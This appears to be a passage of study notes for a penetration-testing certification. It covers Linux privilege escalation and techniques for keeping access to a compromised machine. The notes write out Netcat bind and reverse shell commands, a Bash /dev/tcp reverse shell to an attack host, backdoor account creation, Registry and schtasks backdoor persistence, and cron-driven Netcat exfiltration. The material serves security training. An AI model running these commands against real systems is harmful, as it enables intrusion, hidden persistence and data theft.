| :---------------------------------------: | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|     `/etc/passwd`, <br>`/etc/shadow`      | Obtain a copy of these files to crack <br>root or privileged user passwords.                                                                                                                       | Metasploit module:<br><br>`post/linux/gather/hashdump`<br><br>John the Ripper and other password crackers.<br>(See previous discussion, "Password Cracking in Linux.")                                                                                                                                                                                                                                                                                                                                                                         |
|         Weak process permissions          | Find processes with weak controls <br>and see if you can inject malicious <br>code into those processes.                                                                                           | Metasploit modules:<br><br>`post/multi/recon/local_exploit_suggester`<br><br>`post/multi/manage/shell_to_meterpreter`<br><br>Meterpreter `migrate` and `getsystem` commands                                                                                                                                                                                                                                                                                                                                                                    |
|        User application compromise        | Compromise end user applications <br>and plug-ins such as OpenOffice, VNC, <br>and Adobe Flash Player. Some require social <br>engineering to get the end user to open <br>a file or browser page. | Metasploit modules:<br><br>`exploit/multi/vnc/vnc_keyboard_exec`<br><br>`auxiliary/fileformat/odt_badodt`<br><br>`exploit/multi/misc/openoffice_document_macro`<br><br>`exploit/multi/browser/adobe_flash_hacking_team_uaf`<br><br>`exploit/multi/browser/adobe_flash_nellymoser_bof`                                                                                                                                                                                                                                                          |
|        SetUID (SUID) binaries<br>         | Locate applications you can run as root.                                                                                                                                                           | At a terminal, enter:<br><br>`sudo find / -perm -04000`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
|         Services running as root          | Locate services that are owned by <br>(running as) root and see if you can <br>compromise them.                                                                                                    | Find out who you are: whoami<br><br>List all processes owned by you: `ps -x`<br><br>Locate processes owned by root: `ps -fU root`<br><br>List all processes and their owners: `ps -ef`                                                                                                                                                                                                                                                                                                                                                         |
|              Shared folders               | Search for sensitive information in <br>Samba shared folders, as it is common <br>for them to have few or no restrictions.                                                                         | Metasploit module:<br><br>`auxiliary/scanner/smb/smb_enumshares`<br><br>enum4linux                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
|        Kernel and service exploits        | Find exploits that target the kernel and <br>privileged services.                                                                                                                                  | `nmap -sV`<br><br>(Kali) Linux Exploit Suggester<br><br>Metasploit module: `post/multi/recon/local_exploit_suggester`                                                                                                                                                                                                                                                                                                                                                                                                                          |
|            Meterpreter upgrade            | If you have a Bash shell from Metasploit, <br>try to upgrade it to the more versatile <br>Meterpreter.                                                                                             | Metasploit module:<br><br>`post/multi/manage/shell_to_meterpreter`<br><br>[http://www.hackingarticles.in/command-shell-to-meterpreter/](http://www.hackingarticles.in/command-shell-to-meterpreter/)                                                                                                                                                                                                                                                                                                                                           |
|              Netcat upgrade               | If you have a Netcat shell, try to upgrade it <br>to a fully interactive TTY or Meterpreter.                                                                                                       | [https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)<br><br>[https://www.hackingtutorials.org/networking/upgrading-netcat-shells-to-meterpreter/](https://www.hackingtutorials.org/networking/upgrading-netcat-shells-to-meterpreter/)<br><br>[https://security.stackexchange.com/questions/161214/upgrade-a-ncat-bind-shell-to-meterpreter](https://security.stackexchange.com/questions/161214/upgrade-a-ncat-bind-shell-to-meterpreter) |
|             Exploit cron jobs             | Exploit badly configured cron jobs to gain root access.                                                                                                                                            | [http://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/](http://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/)                                                                                                                                                                                                                                                                                                                                                                         |
| Missing patches and <br>misconfigurations | Search for missing patches or common <br>misconfigurations that can lead to privilege <br>escalation.                                                                                              | BeRoot Project:<br><br>[https://github.com/AlessandroZ/BeRoot](https://github.com/AlessandroZ/BeRoot)                                                                                                                                                                                                                                                                                                                                                                                                                                          |

> [!warning] To search for Metasploit modules that are application specific, at the `msfconsole`, enter `search platform:linux`. For example: `search adobe platform:linux`.

> [!warning] *For more information on privilege escalation in Linux, see:*
> - [https://hackmag.com/security/reach-the-root/](https://hackmag.com/security/reach-the-root/).
> - [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/).
> - [https://guif.re/linuxeop](https://guif.re/linuxeop).

> [!warning] On Linux systems, you can use the **`sudo -l`** command to view available commands of the current user. Using the output, refer to GTFOBins (gtfobins.github.io) to see possible escalation paths.

## Topic 16C - Maintain Persistence
---
> [!note] Exam Objectives Covered
> *3.7 Given a scenario, perform post-exploitation techniques.*

Once access is gained, creating a foothold is an important step in keeping your targets alive and accessible. Being able to move around a network is valuable to the PenTester, but there are times when you'll want to stay put for as long as you can.

In this topic, you'll use various techniques to maintain your foothold in the organization.

### Creating A Foothold
---
***Persistence*** is the quality by which a threat continues to exploit a target while remaining undetected for a significant period of time. Rather than hitting a target and leaving right after, attackers will look for ways to maintain their foothold in the organization, long after the main attack phase has concluded.

Some of the goals involved in persistence include:

- Exfiltrating portions of sensitive data over a period of time rather than all at once. This is a stealthier approach than just overloading the network with the target data in one “loud” task.
- Exfiltrating sensitive data that changes over time. A customer records database will probably be continuously updated with information about individuals and organizations. Rather than capturing the database once at a specific point in time, the attacker could capture the database multiple times, as it changes.
- Causing a sustained or repeated denial of service. Launching a DoS attack at a server once will take it down for a while, but recovery personnel will probably bring it right back up as soon as they can. With persistent access, an attacker could take down a server over and over again, despite the recovery team's best efforts.
- Monitoring user behavior over time. Sometimes, directly accessing people’s information isn't feasible, or isn't stealthy enough, so an attacker might choose to monitor a user's behavior for the information they're looking for. For example, a keylogger installed on a public terminal might not reveal anything useful right away but, after a while, an administrator might enter their credentials into this terminal.
- Taunting or spreading confusion within an organization. It is mostly just annoying when an attacker compromises the means of communication in order to send a few taunting messages to personnel. However, attackers who maintain their compromise of communications over a long period of time can cause a great deal of consternation by harassing individuals and undermining the confidence they have in their colleagues and employer.
- Compromising systems, networks, applications, and other assets for days, weeks, months, or even years.

As a PenTester, you probably won't be maintaining your attack efforts for very long, but it depends on the scope of the test and how willing the organization is to leave their assets in a state of compromise. What's more likely, is that you'll conduct efforts to prove that persistence is possible and has a high chance of occurring, and then demonstrate it during the test and/or report on it afterwards.

### Advanced Persistent Threats (APTs)
---
An ***advanced persistent threat (APT)*** is an implementation of persistence that relies on highly customized, complex exploits created and launched by groups of technically skilled individuals with a common goal.

APTs tend to target large financial institutions, government agencies, and other organizations that hold a great deal of power over others. APTs have been known to go years before being discovered, exfiltrating significant volumes of sensitive data from a target, or conducting sustained disruption of business operations.

These are, therefore, some of the most insidious and harmful threats to targeted organizations.

### Bypassing Restrictions
---
There is not one catch-all method for initiating persistence on a network or system. Various techniques can help you maintain access or control over your targets. For example, certain user accounts are more closely monitored or more tightly access-controlled than others. Creating a new account can help you bypass these restrictions when you need to authenticate.

On Windows, you can create a new user through the command shell: **`net user jsmith /add`** and on Linux: **`useradd jsmith`** . Escalating the account's privileges can provide you with even more access.

On Windows, **`net localgroup Administrators jsmith /add`** adds the account to the local Administrators group. On Linux, there are several ways to give root privileges to a user, including **editing the `/etc/passwd` file** **and changing the user's user ID (UID) and group ID (GID) to 0.**

New user creation is just one example of a persistence technique. Remote access services can also be used for persistence. Other common persistence techniques include:

- Backdoors and Trojans
- Bind and Reverse Shells
- Services and Daemons
- Registry Startup
- Scheduled Tasks

### Using Backdoors and Trojans
---
A ***backdoor*** is a hidden mechanism that provides you with access to a system through some alternative means. A backdoor can exist in many forms, but it is always meant to escape the notice of the system's typical users while still enabling unauthorized users to access that system. For example, a new, unauthorized user account can be used as part of a backdoor, so that you don't rely on an active and closely monitored account to gain access.

Another example of a backdoor is a ***remote access tool (RAT)***, also known as a remote access **trojan**. As the latter name implies, a RAT is primarily downloaded to a victim's computer through Trojan horse malware; that is, it either comes along with what appears to be legitimate software or it, itself, is disguised to look like legitimate software.

The function of a RAT is pretty much identical to standard remote access technology and may strictly offer an interactive shell, or may offer full GUI (graphical user interface) services. <mark style="background: #FFF3A3A6;">The primary difference between a RAT and something like RDP, other than the delivery mechanism, is that RATs are specifically designed to remain hidden from view on the infected system.</mark>

Some examples of historically popular RATs include **NetBus**, **Sub7**, **Back Orifice**, **Blackshades**, and **DarkComet**. Today, you can find cross-platform RATs, like **pupy** ( [https://github.com/n1nj4sec/pupy](https://github.com/n1nj4sec/pupy) ), that run on Windows, Linux, macOS and Android. Also, it employs advanced techniques such as having its main execution only in memory, to minimize the footprint left on storage.

While a RAT can escape human notice, the more common ones will be instantly picked up by an anti-malware scanner or intrusion detection system. Advanced RATs, however, can leverage ***rootkit*** technology to infect a system at a low level. The power of these is that they can alter an operating system's kernel or a device's firmware to mask the malicious code's activity. Therefore, a rootkit-empowered RAT can more effectively evade security solutions.

It is important to note that even if a RAT can evade security solutions and initially escape human notice, it can still exhibit behavior that might tip off a user, such as excessive or unexplained network traffic that traverses the interface.

> [!warning] Hardware backdoors also exist, and can be substantially stealthier, and provide greater levels of access, but they are not commonly used in PenTesting. Most backdoors of this type are incorporated into hardware during the manufacturing process.

#### Remote Access Services
Remote access services like Telnet, SSH, RDP, VNC, etc., can also enable persistence. You can even leverage backdoor accounts with these services, to remotely control the target system. However, remaining stealthy while using these services is especially difficult because of how well-known, closely monitored, and transparent to the system they tend to be.

We discussed CLI remote access services in [Lesson 14](https://learn.comptia.org/app/certmaster-learn-and-certmaster-labs-for-pentest-exam-pt0-002#read/section/lesson-14-introduction-amp-objectives), such as Ncat and SSH, and these can also be used for persistence. Another possible path for persistence is GUI remote access services such as RDP and others we saw on the topic of “Lateral Movement” in this Lesson.

### Employing Reverse and Bind Shells
---
A shell is any program that can be used to execute a command. There are essentially two types of shell attacks: bind and reverse.

A ***bind shell*** is established when the target system "binds" its shell to a local network port. For example, a Linux target might bind the Bash shell on port 12345. One of the most common tools used to create either type of shell is Netcat.

So, on the target system, the Netcat command would be:

`nc -lp 12345 -e /bin/sh`

> [!warning] Use `-e cmd.exe` for a Windows target.

On the attack machine, you'd use Netcat to connect to this session and obtain the shell:

`nc 192.168.1.50 12345`

You can now issue Bash commands to the target machine. This is useful in enabling persistence, as it can function as a backdoor into the target system. The problem with bind shells is that many firewalls will filter incoming traffic on ports that don't meet the pre-configured allowed list, so you may be unable to establish a connection.

Likewise, if the target is behind Network Address Translation (NAT) and you're connecting from an external network, you may not be able to reach the target unless the NAT device is forwarding the specific bound port to the target machine.

A ***reverse shell*** is established when the target machine communicates with an attack machine that is listening on a specific port. First, you start the listener on the attack machine:

`nc -lp 12345`

Then, on the target machine, you'd start the connection:

`nc 192.168.1.10 12345 –e /bin/sh`

The attack machine's listener will accept the incoming connection and open a shell onto the target system. Reverse shells are typically more effective as backdoors because they bypass the aforementioned problems with bind shells. The attacker has more control over their own environment, and is less likely to be obstructed by port filtering or NAT.

In addition, you can create a reverse shell from the target system using a wide array of tools other than Netcat, including Bash, PowerShell, Python, Ruby, PHP, Perl, Telnet, and many more.

For example, if the target system is a Linux machine without Netcat, use Bash to connect to a listener:

`bash -i >& /dev/tcp/192.168.1.10/12345 0>&1`

![[Pasted image 20240620140930.png]]
*A Bind Shell vs. a Reverse Shell*

### Comparing Services and Daemons
---
In the Windows world, a service is any program that runs in the background without directly interfering with the current user's desktop session. This essentially makes services a type of non-interactive process.

In the Unix-like world, a daemon is the closest equivalent to a Windows service. Daemons run in the background but are not attached to any terminal; therefore, they can continue to run on the system even when a terminal is closed.

Many services and daemons automatically start when the system boots, but they can also be activated by certain events or, less commonly, started and stopped manually by the user.

When it comes to PenTesting, services and daemons offer similar opportunities as scheduled tasks, but differ in terms of how they are used as vectors. For example, you might write a ***cron job (A scheduled task that is managed by the Linux cron daemon)*** to execute a Netcat reverse shell command on a Linux target every so often. This, as you've seen, gives you a persistent backdoor into the target system.

<mark style="background: #FFF3A3A6;">However, if you, instead, install a remote access daemon on the target, you could shell into the target at any time and even regain that shell immediately after the system has rebooted.</mark> <mark style="background: #FF5582A6;">Whereas a cron job is limited to a maximum frequency of one minute, a daemon is always active and available for use. Also, it's easier for a daemon to cache its state and sustain long sessions.</mark>

There are several disadvantages to running a daemon over a scheduled task, however. <mark style="background: #FF5582A6;">Daemons consume memory even when not in use, which may tip off a user if they experience performance issues or are actively monitoring memory usage.</mark> <mark style="background: #FFF3A3A6;">Also, daemons do not automatically restart upon termination unless specifically programmed to do so, whereas scheduled tasks can recur automatically.</mark> Lastly, cron jobs are relatively simple to create, whereas daemons require extensive programming knowledge, assuming you're not relying on existing software. Many of these advantages and disadvantages also apply to Windows services when compared to Task Scheduler.

#### Registry and Startup Locations
Services are not the only way to get a particular program or command to start upon booting Windows. You can also add the program or command to the following Registry keys:

`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`

The first key will run all of its values whenever any user logs in; the second key will run only when the current user logs in. You can open the GUI Registry Editor (regedit) to add the desired value, or you can do it from the command line:

`reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdr /d C:\Files\backdoor.bat`

In Linux, depending on the distribution **`/etc/init.d/`** and **`/etc/systemd/`** are examples of similar run-on-boot functionality. Some distributions maintain backwards compatibility with RC scripts: **`/etc/rc.local/`** and entries in the **`rc.common`** file.

### Scheduling Tasks
---
A scheduled task or scheduled job is any instance of execution such as the initiation of a process, or running of a script, that the system performs on a set schedule. Scheduled tasks are a fundamental component of work automation as they empower a system to perform the specified task without requiring a user to start that task. Once the task executes, it can prompt for user interaction or run silently in the background. It all depends on what the task is set up to do. While most scheduled tasks are configured to run at certain times, you can also schedule tasks around certain events, such as a specific user logging in.

Just as scheduled tasks can make a normal user's or administrator's job easier, they can also be a boon to your PenTest campaign. For example, you could manually execute a Netcat data exfiltration command over and over again to always have the most up-to-date version of a sensitive file, but this can become tedious, not to mention noisy. Instead, you could create a scheduled task that silently runs the exfiltration command in the background every so often, perhaps once a day, to automate your persistence in the organization while remaining undetected.

Task Scheduler is the utility that governs scheduled tasks in Windows environments. You can do quite a bit with this utility, including:

- Setting a task’s name and description
- Setting the task's "triggers," e.g., the time or events that will cause the task to start
- Setting the task's actual action, e.g., running a program, executing a command, etc.
- Setting what account to run the task under
- Setting special conditions that might influence when the task will run, such as only running a task if a laptop is connected to AC power
- Configuring additional settings about the task, for example, what to do if the task fails

Note that the time trigger supports granular values. You can, for instance, run the task once a year starting on a specific day, or repeat the task every minute for 60 minutes. You can also identify details about a task, like its next run time, its most recent run time, or the result or exit status of its most recent run. This is made easier through the Task Scheduler GUI. However, as a PenTester, you will likely need to rely on scheduling a task from the command line ( **`schtasks`** ).

The following example schedules a task named "`backdr`" that runs a batch file once a day for 30 days under the SYSTEM account:

`schtasks /create /tn backdr /tr C:\Files\backdoor.bat /sc DAILY /mo 30 /ru SYSTEM`

> [!warning] *For a full list of options for_ schtasks _, see [https://msdn.microsoft.com/en-us/library/windows/desktop/bb736357(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/bb736357(v=vs.85).aspx)*

> [!warning] Scheduled tasks can also leverage application functionality exposed by DCOM, like scheduling the execution of macros in an Excel file.

In Linux, cron jobs are the primary method of scheduling tasks/jobs. The cron daemon runs the specified shell command at the date and/or time specified in the user's crontab file. You can edit this file by entering **`crontab -e`** at a shell.

Each line in this file represents a job, and is formatted as follows:
![[Pasted image 20240620142550.png | 650]]
*Cron Job*

Note that you are not required to specify every time value. The asterisk (`*)` denotes a **wildcard** value and the job will run for every instance of this value.

For example, the following line will run a Netcat file exfiltration listener every day at 9:00 A.M.:

`0 9 * * * nc -lp 12345 > data.txt`

The following example will run the same Netcat command at the top of every hour, every 15th day of every other month:

`0 * 15 */2 * nc -lp 12345 > data.txt`

Note that the month value uses a division operator (`/)` with a wildcard to divide each of the 12 months into 2.

Be aware that the jobs you create with crontab `-e` will run as the current user. You can also directly edit the system's `/etc/crontab` file to run a job as a specific user, though this is usually not recommended. This file takes a user field before the command field, such as:

`0 9 * * * jsmith nc -lp 12345 > data.txt`

### Maintaining Persistence
---
When using persistence techniques, you should follow these guidelines:

- Try to maintain a foothold in the organization to continue your attack after the main phase has concluded.
- Demonstrate persistence to the client without necessarily keeping assets compromised for a long period of time.
- Create new user accounts to bypass access control and account monitoring.
- Escalate new accounts' privileges, if you are able.
- Install a RAT as a backdoor into a target system.
- Create a shell using Netcat to open a backdoor for command execution.
- Use reverse shells instead of bind shells whenever possible.
- Use Netcat to exfiltrate files from a target host to your own host.
- Use Netcat to set up a relay from one target host to another for pivoting.
- Use Task Scheduler in Windows to run a compromising command or program on a consistent schedule.
- Use cron jobs in Linux to do likewise.
- Consider using a backdoor as a daemon or service to have it constantly available.
- Understand the disadvantages of creating and using a daemon or service.
- Add commands or programs to the appropriate Registry startup keys to get them to run on Windows boot.
